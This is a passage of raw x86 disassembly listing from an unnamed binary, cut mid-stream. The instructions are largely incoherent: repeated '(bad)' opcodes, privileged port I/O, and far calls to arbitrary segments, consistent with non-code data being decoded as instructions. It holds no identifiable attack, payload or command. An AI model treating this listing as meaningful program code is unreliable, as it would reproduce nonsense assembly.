  410a2c:	iret   
  410a2d:	jge    0x4109ee
  410a2f:	dec    ebp
  410a30:	(bad)  
  410a31:	out    dx,eax
  410a32:	ds int 0xd5
  410a35:	inc    edx
  410a36:	retf   0x5fdc
  410a39:	(bad)  
  410a3a:	cld    
  410a3b:	lds    edx,FWORD PTR [edx]
  410a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a3e:	dec    esi
  410a3f:	jae    0x410abc
  410a41:	xchg   ebx,eax
  410a42:	dec    eax
  410a43:	(bad)  
  410a44:	arpl   WORD PTR [edi+0x6d],di
  410a47:	fsubr  DWORD PTR [eax-0x1]
  410a4a:	mov    dh,0x97
  410a4c:	jmp    FWORD PTR [eax+ebp*2+0x50]
  410a50:	adc    esi,DWORD PTR [edx]
  410a52:	arpl   WORD PTR ds:0x26a65991,dx
  410a58:	sbb    edx,DWORD PTR [eax]
  410a5a:	xor    ebx,ebp
  410a5c:	test   DWORD PTR [ebp+0x39b9be34],eax
  410a62:	mov    dh,0x85
  410a64:	xchg   edi,eax
  410a65:	mov    BYTE PTR [eax+ebx*2],cl
  410a68:	adc    al,0xaf
  410a6a:	dec    eax
  410a6b:	pop    ebp
  410a6c:	cmp    edx,DWORD PTR [ebx+0x2a3660ff]
  410a72:	lock inc edx
  410a74:	fisub  DWORD PTR [eax+eiz*2]
  410a77:	and    bl,bh
  410a79:	sti    
  410a7a:	aas    
  410a7b:	(bad)  
  410a7c:	pop    edx
  410a7d:	dec    ecx
  410a7e:	cmp    esp,ecx
  410a80:	jo     0x410a14
  410a82:	bound  ebp,QWORD PTR [edx+0x3d9f5f50]
  410a88:	mov    ebx,0xf9da185b
  410a8d:	push   ecx
  410a8e:	jmp    0x410aae
  410a90:	fst    QWORD PTR [edi+0x8]
  410a93:	pop    ss
  410a94:	in     eax,0xde
  410a96:	retf   
  410a97:	rcl    DWORD PTR [eax-0x38],cl
  410a9a:	in     al,dx
  410a9b:	xchg   esi,eax
  410a9c:	fwait
  410a9d:	xchg   edi,eax
  410a9e:	jbe    0x410b1c
  410aa0:	imul   esi,DWORD PTR [ecx+0x5a000dfa],0x8bdde4b2
  410aaa:	pop    esp
  410aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aac:	clc    
  410aad:	mov    ecx,0x7e21edfe
  410ab2:	ds pop esp
  410ab4:	popa   
  410ab5:	arpl   WORD PTR [eax],sp
  410ab7:	aad    0x6a
  410ab9:	mov    eax,0xbd6f57f0
  410abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410abf:	and    eax,0x29d38c80
  410ac4:	mov    esi,0x7f4bbc31
  410ac9:	mov    esi,0xaee99cfe
  410ace:	nop
  410acf:	out    0xed,eax
  410ad1:	push   0x8568bb98
  410ad6:	pop    edi
  410ad7:	jmp    0xb919:0xce246687
  410ade:	mov    esi,0x2a62b654
  410ae3:	push   cs
  410ae4:	addr16 cs in eax,dx
  410ae7:	scas   al,BYTE PTR es:[edi]
  410ae8:	fisubr DWORD PTR [ebx]
  410aea:	adc    ah,BYTE PTR [ecx]
  410aec:	loopne 0x410a79
  410aee:	xchg   DWORD PTR [esi-0x773db2f7],edi
  410af4:	repnz stos BYTE PTR es:[edi],al
  410af6:	fdiv   QWORD PTR [eax]
  410af8:	and    BYTE PTR ds:0xe28b25a2,bh
  410afe:	jg     0x410ab7
  410b00:	mov    dl,0x3b
  410b02:	lahf   
  410b03:	pop    ebp
  410b04:	mov    bh,0xf7
  410b06:	jne    0x410ae2
  410b08:	dec    ebp
  410b09:	out    dx,eax
  410b0a:	mov    esi,0x4e4e8830
  410b0f:	mov    cl,0x64
  410b11:	pop    ebp
  410b12:	call   0x851514c4
  410b17:	or     ah,dl
  410b19:	repz cdq 
  410b1b:	iret   
  410b1c:	int3   
  410b1d:	arpl   WORD PTR [esi-0x25e91fbb],cx
  410b23:	sbb    edx,DWORD PTR [ecx+0x2d]
  410b26:	sbb    DWORD PTR ds:0xfa381603,ebx
  410b2c:	pop    edi
  410b2d:	sbb    eax,0xb2189403
  410b32:	cmp    eax,0xbd7ae90e
  410b37:	xchg   BYTE PTR [ebx],ah
  410b39:	sar    DWORD PTR [esi],1
  410b3b:	cmp    BYTE PTR [ecx-0x51],al
  410b3e:	jmp    0x86417d10
  410b43:	mov    bh,BYTE PTR [edi+0x1]
  410b46:	fsubr  QWORD PTR [esi+0x1b]
  410b49:	dec    eax
  410b4a:	jne    0x410ad1
  410b4c:	push   ss
  410b4d:	mov    esp,0x6f2cf04b
  410b52:	jmp    0x410b52
  410b54:	dec    esi
  410b55:	push   eax
  410b56:	inc    esi
  410b57:	add    esi,eax
  410b59:	or     BYTE PTR [ecx],dl
  410b5b:	iret   
  410b5c:	push   ebx
  410b5d:	(bad)  
  410b5f:	scas   al,BYTE PTR es:[edi]
  410b60:	jg     0x410b59
  410b62:	adc    BYTE PTR [edi],bl
  410b64:	mov    al,ds:0x22915763
  410b69:	pop    edi
  410b6a:	cmp    eax,0x6aa738e1
  410b6f:	sub    ecx,DWORD PTR [ecx-0x53]
  410b72:	test   eax,0x5cb528c4
  410b77:	sbb    eax,0x493dd234
  410b7c:	outs   dx,BYTE PTR ds:[esi]
  410b7d:	xchg   bl,cl
  410b7f:	leave  
  410b80:	sbb    dl,cl
  410b82:	jmp    0xcb42:0x6ffba03
  410b89:	sub    edi,eax
  410b8b:	dec    edi
  410b8c:	cmp    esp,edi
  410b8e:	jno    0x410bea
  410b90:	idiv   DWORD PTR [ebx]
  410b92:	(bad)  
  410b93:	cmp    eax,0x22637715
  410b98:	call   0xa2653276
  410b9d:	add    al,0xa2
  410b9f:	add    eax,0x72f96a01
  410ba4:	data16 stos BYTE PTR es:[edi],al
  410ba6:	jmp    DWORD PTR [edi]
  410ba8:	inc    edx
  410ba9:	xchg   ebp,eax
  410baa:	in     eax,0x0
  410bac:	push   ecx
  410bad:	loop   0x410b39
  410baf:	repnz sub esi,DWORD PTR [ebx+0x2c]
  410bb3:	dec    ecx
  410bb4:	mov    esi,0xb1b12a22
  410bb9:	pop    ds
  410bba:	adc    al,0x53
  410bbc:	call   0xd0b9:0xfbdd9b07
  410bc3:	or     ebp,DWORD PTR [esi+edx*8-0x168ed286]
  410bca:	int    0xab
  410bcc:	cdq    
  410bcd:	repz jno 0x410c3e
  410bd0:	retf   0xd2e3
  410bd3:	sub    DWORD PTR [edi+0x78],eax
  410bd6:	ds call 0x679916
  410bdc:	xor    dh,BYTE PTR [edi-0x574f817e]
  410be2:	cli    
  410be3:	jl     0x410bc1
  410be5:	jns    0x410bb7
  410be7:	scas   eax,DWORD PTR es:[edi]
  410be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be9:	xchg   edi,eax
  410bea:	ror    DWORD PTR [edx-0x3f752abd],cl
  410bf0:	pop    es
  410bf1:	xchg   ecx,eax
  410bf2:	xor    al,0x12
  410bf4:	rcl    DWORD PTR ds:0xab28331b,0x7e
  410bfb:	fmulp  st(0),st
  410bfd:	mov    esi,0x163270f1
  410c02:	mov    al,0xd2
  410c04:	add    eax,0x5207383f
  410c09:	dec    esp
  410c0a:	js     0x410ba9
  410c0c:	cmp    BYTE PTR [esp+edi*8+0x2f],cl
  410c10:	or     edi,DWORD PTR [edx-0x9]
  410c13:	in     eax,0xe2
  410c15:	clc    
  410c16:	icebp  
  410c17:	sub    eax,0x27b56bfd
  410c1c:	popf   
  410c1d:	or     al,0xf0
  410c1f:	pop    edx
  410c20:	push   edi
  410c21:	jae    0x410c98
  410c23:	das    
  410c24:	imul   edx,DWORD PTR [ebp-0x63],0x5563b574
  410c2b:	loopne 0x410bff
  410c2d:	outs   dx,DWORD PTR ds:[esi]
  410c2e:	xchg   ebx,eax
  410c2f:	lods   al,BYTE PTR ds:[esi]
  410c30:	or     ebp,ebx
  410c32:	(bad)  
  410c33:	pop    ds
  410c34:	cs cdq 
  410c36:	shl    BYTE PTR [ebp-0x5d1ed25d],cl
  410c3c:	xlat   BYTE PTR ds:[ebx]
  410c3d:	arpl   WORD PTR [edx],si
  410c3f:	push   ebp
  410c40:	xchg   BYTE PTR [ebx+0x9778f04],bh
  410c46:	addr16 pop eax
  410c48:	cmp    ebp,DWORD PTR [eax+0x470e9802]
  410c4e:	add    BYTE PTR [esi],dh
  410c50:	sar    BYTE PTR [ebp+0x4ca5ef80],1
  410c56:	test   BYTE PTR [eax-0xa],cl
  410c59:	mov    eax,0xf82beb83
  410c5e:	jb     0x410c30
  410c60:	jae    0x410c90
  410c62:	rol    ebx,cl
  410c64:	jge    0x410bf4
  410c66:	fisttp QWORD PTR [edi+0x50fd4a08]
  410c6c:	js     0x410c82
  410c6e:	mov    al,ds:0x77d07f26
  410c73:	mov    bh,BYTE PTR [ebp+0x4a2f5556]
  410c79:	in     eax,dx
  410c7a:	inc    ebx
  410c7b:	add    edx,ebx
  410c7d:	adc    ah,dh
  410c7f:	adc    BYTE PTR ds:0xed53c3f,al
  410c85:	lods   al,BYTE PTR ds:[esi]
  410c86:	ror    BYTE PTR [eiz*4-0x2f660b60],1
  410c8d:	inc    edi
  410c8e:	rcr    DWORD PTR [esi],cl
  410c90:	push   ds
  410c91:	fst    QWORD PTR [ecx+0x2a]
  410c94:	add    al,bl
  410c96:	retf   0x7ff6
  410c99:	dec    ebp
  410c9a:	scas   eax,DWORD PTR es:[edi]
  410c9b:	push   0x98acd886
  410ca0:	mov    DWORD PTR [edi-0xea8a6f9],ebx
  410ca6:	nop
  410ca7:	mov    BYTE PTR [edx-0x5663e8a0],ch
  410cad:	aaa    
  410cae:	cmp    DWORD PTR [ecx+edx*1+0x3c],ebx
  410cb2:	jg     0x410cd6
  410cb4:	inc    eax
  410cb5:	xchg   ebx,eax
  410cb6:	cmp    DWORD PTR [ebx],esi
  410cb8:	pusha  
  410cb9:	rcr    ch,0xe2
  410cbc:	push   edx
  410cbd:	mov    ecx,0xc8aecc97
  410cc2:	loop   0x410d23
  410cc4:	jae    0x410c88
  410cc6:	or     BYTE PTR [edx+0x1f],0x15
  410cca:	push   eax
  410ccb:	mov    edi,0x42832c15
  410cd0:	cmp    BYTE PTR ds:0x1f6138a6,dl
  410cd6:	in     eax,0x69
  410cd8:	sub    BYTE PTR [ecx+edi*4-0x52],cl
  410cdc:	push   ds
  410cdd:	int    0xa3
  410cdf:	in     al,dx
  410ce0:	pop    ebp
  410ce1:	dec    ecx
  410ce2:	dec    ebx
  410ce3:	pop    ds
  410ce4:	xor    eax,0xe40a1f4e
  410ce9:	or     ecx,DWORD PTR [ecx+0x64]
  410cec:	pop    edx
  410ced:	jp     0x410d60
  410cef:	xlat   BYTE PTR ds:[ebx]
  410cf0:	(bad)  
  410cf1:	sti    
  410cf2:	dec    ebx
  410cf3:	into   
  410cf4:	mov    ?,WORD PTR [esi]
  410cf6:	dec    edx
  410cf7:	xchg   ebp,eax
  410cf8:	sub    esi,DWORD PTR [edx-0x286f69ac]
  410cfe:	inc    eax
  410cff:	ja     0x410c9e
  410d01:	daa    
  410d02:	loopne 0x410d6e
  410d04:	fbstp  TBYTE PTR [ebx+0x7f]
  410d07:	dec    edx
  410d08:	lds    esi,FWORD PTR [ecx+0x72]
  410d0b:	sbb    eax,0x2094f547
  410d10:	inc    ebx
  410d11:	lods   eax,DWORD PTR ds:[esi]
  410d12:	ins    BYTE PTR es:[edi],dx
  410d13:	and    cl,BYTE PTR [esi]
  410d15:	inc    edx
  410d16:	xor    al,0x82
  410d18:	or     edi,DWORD PTR [ecx+0x26735036]
  410d1e:	or     DWORD PTR [edx],0xe30d75d3
  410d24:	pop    ds
  410d25:	sbb    ch,0x15
  410d28:	mov    esp,0x9ee71893
  410d2d:	imul   bl
  410d2f:	sbb    al,bl
  410d31:	les    esp,FWORD PTR [eax]
  410d33:	xor    esp,DWORD PTR [esi+0x44]
  410d36:	loope  0x410d42
  410d38:	adc    DWORD PTR [edx+ebp*4+0x298027b6],0x32
  410d40:	aad    0xe9
  410d42:	xor    eax,0xf7b4e01
  410d47:	test   al,0xbd
  410d49:	jmp    0x410d3e
  410d4b:	sbb    eax,0x99cdcee9
  410d50:	mov    eax,0xcc6447f
  410d55:	sbb    BYTE PTR [esi-0x25],ch
  410d58:	jg     0x410d69
  410d5a:	xor    edi,DWORD PTR [ebp+0x21451d8a]
  410d60:	(bad)  
  410d62:	mov    cl,0x15
  410d64:	data16 mov al,ds:0xd415f2e6
  410d6a:	outs   dx,DWORD PTR ds:[esi]
  410d6b:	test   DWORD PTR [edx+0x51],eax
  410d6e:	cmp    eax,0xa620033
  410d73:	and    esi,ebp
  410d75:	daa    
  410d76:	scas   eax,DWORD PTR es:[edi]
  410d77:	call   0x88a3:0x1bc1795
  410d7e:	or     BYTE PTR [eax],dh
  410d80:	(bad)  
  410d81:	test   BYTE PTR [eax],0x5a
  410d84:	iret   
  410d85:	xchg   ecx,eax
  410d86:	xor    eax,0x56f564c2
  410d8b:	dec    esp
  410d8c:	adc    eax,DWORD PTR [eax]
  410d8e:	ret    0x52ef
  410d91:	(bad)  
  410d94:	mov    al,ds:0x755e752a
  410d99:	ror    DWORD PTR [ecx-0x69],0xc4
  410d9d:	(bad)  
  410d9e:	fcmovbe st,st(6)
  410da0:	pop    ebx
  410da1:	psrld  mm7,QWORD PTR [ebp-0x41]
  410da5:	sbb    ecx,DWORD PTR [esi-0x262c8f82]
  410dab:	mov    edi,0x6f7d703d
  410db0:	sub    esp,ebx
  410db2:	mov    DWORD PTR [esi],eax
  410db4:	into   
  410db5:	pop    edx
  410db6:	sub    ah,BYTE PTR ds:0x506f9cd3
  410dbc:	cld    
  410dbd:	jns    0x410d98
  410dbf:	or     al,0x64
  410dc1:	fdiv   st(4),st
  410dc3:	fcomip st,st(3)
  410dc5:	(bad)  
  410dc6:	pushf  
  410dc7:	adc    bh,BYTE PTR [eax]
  410dc9:	adc    ch,BYTE PTR ds:0xdba2b950
  410dcf:	data16 sbb dh,BYTE PTR [ecx-0x7c04d80a]
  410dd6:	lds    ebp,FWORD PTR [edi]
  410dd8:	push   edi
  410dd9:	add    BYTE PTR [ecx+0x7bb4f04f],ah
  410ddf:	in     eax,dx
  410de0:	mov    ch,0x9c
  410de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410de3:	hlt    
  410de4:	call   0xfe60341f
  410de9:	retf   0x24f5
  410dec:	pop    edx
  410ded:	fdivp  st(0),st
  410def:	addr16 push ebx
  410df1:	pusha  
  410df2:	xor    al,0xd9
  410df4:	cmp    esp,DWORD PTR [ecx+0x30e69a5d]
  410dfa:	icebp  
  410dfb:	sahf   
  410dfc:	imul   ecx,DWORD PTR [ebp-0x40],0x3b
  410e00:	and    eax,0xe494febc
  410e05:	call   0xfed2:0x40808abd
  410e0c:	stos   DWORD PTR es:[edi],eax
  410e0d:	cmp    DWORD PTR [ebx],edx
  410e0f:	jae    0x410ddf
  410e11:	fsubrp st(6),st
  410e13:	mov    bh,0x81
  410e15:	mov    ecx,0x53cafa3d
  410e1a:	or     BYTE PTR [ebp+0x6e],0x58
  410e1e:	inc    ebx
  410e1f:	pop    eax
  410e20:	(bad)  
  410e21:	popa   
  410e22:	hlt    
  410e23:	aam    0x2f
  410e25:	ret    
  410e26:	mov    bh,0x9b
  410e28:	and    BYTE PTR [esi-0x91088ff],ah
  410e2e:	je     0x410e63
  410e30:	jle    0x410dbb
  410e32:	ds hlt 
  410e34:	lds    ebx,FWORD PTR [ebx+0x4a]
  410e37:	mov    ecx,0xc5c33f2
  410e3c:	mov    ds:0x2cb2c1c,eax
  410e41:	out    0x70,al
  410e43:	ins    BYTE PTR es:[edi],dx
  410e44:	ret    
  410e45:	mov    eax,ds:0xd59d3ad3
  410e4a:	jns    0x410e35
  410e4c:	push   ecx
  410e4d:	pop    ebx
  410e4e:	xor    ch,ah
  410e50:	sbb    DWORD PTR [edi],esi
  410e52:	adc    ah,BYTE PTR [ecx]
  410e54:	imul   eax,DWORD PTR [ebx+0x13ce7f15],0x27
  410e5b:	push   ebx
  410e5c:	(bad)
  410e60:	cmp    ebx,DWORD PTR [edi-0x7e]
  410e63:	and    DWORD PTR [ebx+0x57c32e90],eax
  410e69:	ins    BYTE PTR es:[edi],dx
  410e6a:	push   esp
  410e6b:	or     DWORD PTR [ebx],ecx
  410e6d:	aam    0xc6
  410e6f:	cld    
  410e70:	add    eax,0x363689a2
  410e75:	inc    esp
  410e76:	adc    bl,BYTE PTR [edi+ebx*2-0x90d8d5a]
  410e7d:	in     eax,dx
  410e7e:	jge    0x410e09
  410e80:	fst    QWORD PTR [ebp-0x2c469e82]
  410e86:	leave  
  410e87:	xor    BYTE PTR [esi-0x3d],bh
  410e8a:	out    dx,eax
  410e8b:	inc    ebx
  410e8c:	ret    0xd243
  410e8f:	push   esi
  410e90:	push   0x38
  410e92:	mov    bl,0xdf
  410e94:	in     al,0xe4
  410e96:	rcr    BYTE PTR [ecx+eax*4],1
  410e99:	xor    al,0x1d
  410e9b:	out    dx,al
  410e9c:	add    DWORD PTR [ebp-0x56f6014d],ebp
  410ea2:	push   esi
  410ea3:	mov    eax,ds:0xb6643827
  410ea8:	dec    ebp
  410ea9:	daa    
  410eaa:	push   edx
  410eab:	leave  
  410eac:	sub    ah,0x72
  410eaf:	loope  0x410ee3
  410eb1:	shl    DWORD PTR [edi+eiz*8+0x74],1
  410eb5:	aad    0x93
  410eb7:	adc    ch,BYTE PTR ss:[ecx-0x642791e4]
  410ebe:	cmp    eax,0x339ac8d3
  410ec3:	xchg   edi,eax
  410ec4:	aam    0x75
  410ec6:	inc    ecx
  410ec7:	dec    ebp
  410ec8:	test   BYTE PTR [edi+0x72ea5b05],bh
  410ece:	cmp    eax,ebx
  410ed0:	mov    al,ds:0xc7c61f9d
  410ed5:	ins    DWORD PTR es:[edi],dx
  410ed6:	call   0xb66d3f76
  410edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410edc:	dec    ebp
  410edd:	sti    
  410ede:	fistp  QWORD PTR [esi]
  410ee0:	adc    al,0x2
  410ee2:	scas   al,BYTE PTR es:[edi]
  410ee3:	aaa    
  410ee4:	dec    esi
  410ee5:	test   bl,bl
  410ee7:	in     eax,0xe5
  410ee9:	or     al,0xb0
  410eeb:	mov    ds:0xd1ddc2dc,eax
  410ef0:	test   al,0xf1
  410ef2:	dec    ecx
  410ef3:	clc    
  410ef4:	mov    ah,0x8e
  410ef6:	(bad)  [edx+0x62]
  410ef9:	mov    al,ss:0x5e350496
  410eff:	bound  edx,QWORD PTR [ebx+0x7e]
  410f02:	xchg   BYTE PTR ds:0xa199e1ef,ah
  410f08:	fxch   st(0)
  410f0a:	inc    eax
  410f0b:	jae    0x410eaf
  410f0d:	add    eax,0x8c36d9f0
  410f12:	movd   mm5,DWORD PTR [eax+0x2edf2848]
  410f19:	inc    esp
  410f1a:	popa   
  410f1b:	xchg   ecx,eax
  410f1c:	mov    al,0xa2
  410f1e:	sbb    cl,BYTE PTR [eax]
  410f20:	sub    DWORD PTR [ebx+edx*1],0xffffffb6
  410f24:	sub    DWORD PTR [ecx+0x52],eax
  410f27:	fs mov ecx,0xe5061bca
  410f2d:	and    al,0xf4
  410f2f:	in     al,dx
  410f30:	jb     0x410f80
  410f32:	mov    esp,edi
  410f34:	xchg   edi,eax
  410f35:	dec    di
  410f37:	mov    DWORD PTR ds:0x15a068a6,edi
  410f3d:	xchg   esp,eax
  410f3e:	(bad)  [ebx+0x794a10f1]
  410f44:	js     0x410f66
  410f46:	dec    esi
  410f47:	mov    ecx,0x7b54faeb
  410f4c:	mov    esp,0xcda6cc66
  410f51:	xlat   BYTE PTR ds:[ebx]
  410f52:	push   ss
  410f53:	fbld   TBYTE PTR [esp+ecx*8+0x1d]
  410f57:	xlat   BYTE PTR ds:[ebx]
  410f58:	sub    BYTE PTR [ebx],dl
  410f5a:	shr    DWORD PTR [ecx+eiz*8+0x20],cl
  410f5e:	cli    
  410f5f:	xchg   ecx,eax
  410f60:	fild   WORD PTR [esi+0x35]
  410f63:	test   al,0x3a
  410f65:	clc    
  410f66:	aad    0xb7
  410f68:	aas    
  410f69:	into   
  410f6a:	(bad)  
  410f6b:	cmp    BYTE PTR [eax+0x595614dd],bl
  410f71:	add    BYTE PTR ds:[ebx-0x3f88a9a4],cl
  410f78:	cmp    BYTE PTR [edi],dl
  410f7a:	push   ecx
  410f7b:	jp     0x410f18
  410f7d:	aad    0xc9
  410f7f:	(bad)  [edx]
  410f81:	jl     0x410f62
  410f83:	pusha  
  410f84:	pop    ds
  410f85:	mov    ch,0x9f
  410f87:	xlat   BYTE PTR ds:[ebx]
  410f88:	pop    esi
  410f89:	sbb    eax,edi
  410f8b:	adc    al,0x18
  410f8d:	fbld   TBYTE PTR [ebx+eiz*1-0xd9ea068]
  410f94:	pop    edx
  410f95:	mov    DWORD PTR [eax+eax*8],esp
  410f98:	xchg   edx,eax
  410f99:	and    edx,ebx
  410f9b:	lock in al,0x67
  410f9e:	sbb    al,0xac
  410fa0:	pop    esi
  410fa1:	push   edi
  410fa2:	nop
  410fa3:	mov    ebp,0x2ced5cd1
  410fa8:	imul   ebx,DWORD PTR [eax],0x8c6e4168
  410fae:	dec    ebp
  410faf:	xor    dl,dh
  410fb1:	xchg   ecx,eax
  410fb2:	pop    esi
  410fb3:	mov    edi,0xa14fc9f8
  410fb8:	loop   0x410f77
  410fba:	retf   
  410fbb:	mov    dl,0xf6
  410fbd:	push   ds
  410fbe:	push   0xfffffff6
  410fc0:	and    eax,0xaa1e28b
  410fc5:	enter  0x4ce3,0xd2
  410fc9:	fwait
  410fca:	scas   eax,DWORD PTR es:[edi]
  410fcb:	pusha  
  410fcc:	sbb    BYTE PTR [ecx],0x45
  410fcf:	add    eax,0xcb3b2d5f
  410fd4:	stc    
  410fd5:	cmp    eax,0xbd52ba14
  410fda:	or     esi,0xe0c414f0
  410fe0:	icebp  
  410fe1:	xchg   edi,eax
  410fe2:	xor    BYTE PTR [edx+0x6ce1a612],dh
  410fe8:	loopne 0x410fc9
  410fea:	push   0xffffffeb
  410fec:	cmp    BYTE PTR [ebp-0x7d],0x82
  410ff0:	lahf   
  410ff1:	fsub   DWORD PTR [edx+0x1e]
  410ff4:	pushf  
  410ff5:	pop    eax
  410ff6:	clc    
  410ff7:	in     al,dx
  410ff8:	jo     0x41103a
  410ffa:	cwde   
  410ffb:	xchg   esi,eax
  410ffc:	out    dx,eax
  410ffd:	xchg   ebp,eax
  410ffe:	push   esp
  410fff:	fstp   DWORD PTR [edx-0x501f9a]
  411005:	sbb    eax,0x3675a1cf
  41100a:	and    eax,0x92254595
  41100f:	push   edi
  411010:	push   0xe
  411012:	mov    esi,0xdc6f2b5d
  411017:	popa   
  411018:	mov    edx,0x7a6b30a9
  41101d:	lahf   
  41101e:	jecxz  0x41104e
  411020:	(bad)  
  411021:	mov    edi,0x2c24c93f
  411026:	shl    BYTE PTR [esi+0x1e08a641],0x89
  41102d:	ret    0x119e
  411030:	(bad)  
  411031:	mov    ebp,0xb62bc77c
  411036:	stos   DWORD PTR es:[edi],eax
  411037:	mov    bh,0xe3
  411039:	jle    0x411058
  41103b:	xor    BYTE PTR [ecx-0x486607b2],0x9c
  411042:	mov    al,ds:0xd0fd2218
  411047:	mov    ecx,0x673890b
  41104c:	icebp  
  41104d:	out    0x20,al
  41104f:	call   0xe67d9db9
  411054:	xchg   edx,eax
  411055:	adc    al,0x17
  411057:	cmp    eax,0x1b66a639
  41105c:	cmc    
  41105d:	icebp  
  41105e:	dec    ebp
  41105f:	pushf  
  411060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411061:	loope  0x411074
  411063:	cli    
  411064:	ficomp WORD PTR [edx]
  411066:	leave  
  411067:	pusha  
  411068:	mov    ds:0xdaefd4e9,eax
  41106d:	and    al,0xb5
  41106f:	jo     0x4110d7
  411071:	call   0xb3ef:0x6d97c81f
  411078:	mov    dh,0xf
  41107a:	inc    ecx
  41107b:	iret   
  41107c:	xchg   esp,eax
  41107d:	lods   al,BYTE PTR ds:[esi]
  41107e:	in     al,dx
  41107f:	xlat   BYTE PTR ds:[ebx]
  411080:	ins    DWORD PTR es:[edi],dx
  411081:	adc    BYTE PTR [ecx+0x2],0xd5
  411085:	pop    es
  411086:	ins    BYTE PTR es:[edi],dx
  411087:	scas   eax,DWORD PTR es:[edi]
  411088:	retf   
  411089:	cli    
  41108a:	cli    
  41108b:	xchg   edi,eax
  41108c:	jbe    0x411026
  41108e:	daa    
  41108f:	dec    eax
  411090:	or     ah,BYTE PTR [edi-0xbef9fa3]
  411096:	das    
  411097:	adc    BYTE PTR [ecx],ch
  411099:	std    
  41109a:	not    BYTE PTR [edi+0x58]
  41109d:	pop    eax
  41109e:	retf   0x1ef1
  4110a1:	in     al,0x97
  4110a3:	pop    ecx
  4110a4:	adc    al,0x7c
  4110a6:	mov    ebp,0x37eaded9
  4110ab:	rol    BYTE PTR [edx-0x4],cl
  4110ae:	mov    bh,0xff
  4110b0:	arpl   WORD PTR [eax],dx
  4110b2:	lea    ebx,[esp+eax*1+0x13519430]
  4110b9:	dec    eax
  4110ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110bb:	je     0x411085
  4110bd:	shr    DWORD PTR cs:[esi+0x47],cl
  4110c1:	sub    DWORD PTR [edi+0x4f27a37f],edx
  4110c7:	sub    ch,BYTE PTR [ecx-0x5b]
  4110ca:	stc    
  4110cb:	cmp    DWORD PTR [esi-0x73],esi
  4110ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110cf:	push   ebx
  4110d0:	mov    ds:0xdfabf0b3,eax
  4110d5:	loope  0x411063
  4110d7:	mov    ds:0xed45a4cf,al
  4110dc:	(bad)  
  4110de:	xor    edx,eax
  4110e0:	xchg   ecx,eax
  4110e1:	push   ss
  4110e2:	daa    
  4110e3:	mov    ebx,0x4c966e81
  4110e8:	aaa    
  4110e9:	daa    
  4110ea:	sub    ecx,DWORD PTR [esi+0x1b]
  4110ed:	mov    bh,0x15
  4110ef:	jns    0x411097
  4110f1:	add    bh,BYTE PTR [ecx-0x623d8869]
  4110f7:	je     0x4110b8
  4110f9:	ret    
  4110fa:	test   DWORD PTR ds:0x71c82bc0,edx
  411100:	inc    ebx
  411101:	inc    esi
  411102:	aad    0xfc
  411104:	rcr    dh,0x1b
  411107:	jmp    0x4110af
  411109:	fs pop ebx
  41110b:	jg     0x4110a5
  41110d:	inc    edi
  41110e:	mov    DWORD PTR [ecx-0x7c],esi
  411111:	or     DWORD PTR [edx+0x27],ebp
  411114:	rcr    BYTE PTR [eax],0x98
  411117:	stc    
  411118:	inc    esp
  411119:	pop    ss
  41111a:	das    
  41111b:	push   ebp
  41111c:	sub    esp,DWORD PTR [bp+di-0x3364]
  411121:	and    DWORD PTR ds:0x7d2c03ae,edx
  411127:	pop    eax
  411128:	neg    DWORD PTR [esi+ebp*2-0x639c2708]
  41112f:	pop    ebp
  411130:	xor    eax,0xf089c587
  411135:	sub    al,0x79
  411137:	sub    cl,BYTE PTR [ebx*8+0x2ae68732]
  41113e:	push   ds
  41113f:	ret    0x3ffc
  411142:	rcr    DWORD PTR [eax],cl
  411144:	mov    al,0x67
  411146:	xlat   BYTE PTR ds:[ebx]
  411147:	add    DWORD PTR [esi+0xf],ebx
  41114a:	sbb    DWORD PTR [edi+esi*2],edi
  41114d:	push   ebx
  41114e:	sbb    al,0xb1
  411150:	cmp    eax,0x1b726ee9
  411155:	ret    
  411156:	or     DWORD PTR [ebx],edx
  411158:	push   ebp
  411159:	fild   WORD PTR [ebx+0x5e]
  41115c:	(bad)  
  41115d:	data16 sub BYTE PTR [edi],dh
  411160:	leave  
  411161:	jp     0x411186
  411163:	push   edi
  411164:	or     bl,BYTE PTR [ecx-0xd]
  411167:	mov    edx,0x699e4405
  41116c:	sets   BYTE PTR [edx]
  41116f:	in     eax,0xa8
  411171:	or     esp,DWORD PTR [eax]
  411173:	idiv   BYTE PTR [eax-0x7a1d1bf1]
  411179:	stc    
  41117a:	push   edi
  41117b:	sub    ecx,DWORD PTR [ecx]
  41117d:	adc    al,0xa3
  41117f:	(bad)  
  411180:	cli    
  411181:	xor    ebx,DWORD PTR [edi-0x43]
  411184:	sub    ah,bl
  411186:	addr16 sbb ah,ah
  411189:	mov    DWORD PTR [edi-0x71b42196],esp
  41118f:	(bad)  
  411191:	test   eax,0x3e65e157
  411196:	ja     0x4111e8
  411198:	out    dx,al
  411199:	sub    al,0xc8
  41119b:	push   es
  41119c:	dec    edi
  41119d:	das    
  41119e:	dec    ebp
  41119f:	adc    eax,ebp
  4111a1:	dec    edi
  4111a2:	xor    DWORD PTR [eax+0x5f6e02db],ebx
  4111a8:	mov    cl,0x31
  4111aa:	leave  
  4111ab:	les    ebp,FWORD PTR [ebx+0x7e]
  4111ae:	imul   esi,DWORD PTR [eax-0x405a891],0xd
  4111b5:	and    esp,DWORD PTR [ebx-0x54]
  4111b8:	mov    esp,0x25b8fbb5
  4111bd:	dec    esi
  4111be:	nop
  4111bf:	sub    eax,0x5680424a
  4111c4:	inc    edx
  4111c5:	jl     0x411229
  4111c7:	enter  0x283d,0x60
  4111cb:	add    eax,0x299c01e7
  4111d0:	popa   
  4111d1:	sub    ch,cl
  4111d3:	jmp    0x411208
  4111d5:	daa    
  4111d6:	(bad)  
  4111d7:	shr    BYTE PTR ds:0x12cc20a6,cl
  4111dd:	pop    ecx
  4111de:	out    dx,al
  4111df:	adc    eax,ebx
  4111e1:	clc    
  4111e2:	push   edx
  4111e3:	js     0x4111a0
  4111e5:	pop    edi
  4111e6:	jne    0x411240
  4111e8:	xor    ebx,DWORD PTR [ebp+0x2d0a26b]
